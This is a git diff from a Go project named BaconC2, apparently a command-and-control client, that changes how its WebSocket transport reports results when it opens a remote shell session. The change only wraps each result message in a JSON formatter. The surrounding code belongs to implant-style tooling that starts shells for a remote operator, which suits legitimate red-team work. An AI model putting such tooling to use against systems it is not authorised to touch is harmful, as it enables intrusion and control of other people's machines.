@@ -18,6 +18,8 @@ import (
 	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 
+	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/formatter"
+
 	"github.com/gorilla/websocket"
 )
 
@@ -127,7 +129,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 		resultChan <- models.CommandResult{
 			ID:     "session_start",
 			Status: "error",
-			Output: map[string]string{"error": err.Error()},
+			Output: formatter.ToJsonString(map[string]string{"error": err.Error()}),
 		}
 		return err
 	}
@@ -137,7 +139,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 		resultChan <- models.CommandResult{
 			ID:     "session_start",
 			Status: "error",
-			Output: map[string]string{"error": err.Error()},
+			Output: formatter.ToJsonString(map[string]string{"error": err.Error()}),
 		}
 		return err
 	}
@@ -151,7 +153,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 		resultChan <- models.CommandResult{
 			ID:     "session_start",
 			Status: "error",
-			Output: map[string]string{"error": fmt.Sprintf("failed to connect to WebSocket: %v", err)},
+			Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("failed to connect to WebSocket: %v", err)}),
 		}
 		return fmt.Errorf("failed to dial WebSocket: %w", err)
 	}
@@ -169,7 +171,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 		resultChan <- models.CommandResult{
 			ID:     "session_start",
 			Status: "error",
-			Output: map[string]string{"error": fmt.Sprintf("failed to start shell: %v", err)},
+			Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("failed to start shell: %v", err)}),
 		}
 		return fmt.Errorf("failed to start shell: %w", err)
 	}
@@ -183,7 +185,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 			resultChan <- models.CommandResult{
 				ID:     "session_start",
 				Status: "error",
-				Output: map[string]string{"error": fmt.Sprintf("shell session error: %v", err)},
+				Output: formatter.ToJsonString(map[string]string{"error": fmt.Sprintf("shell session error: %v", err)}),
 			}
 			t.CloseSession("shell")
 		}
@@ -192,7 +194,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *l
 	resultChan <- models.CommandResult{
 		ID:     "session_start",
 		Status: "success",
-		Output: map[string]string{"message": "Shell session started"},
+		Output: formatter.ToJsonString(map[string]string{"message": "Shell session started"}),
 	}
 	return nil
 }
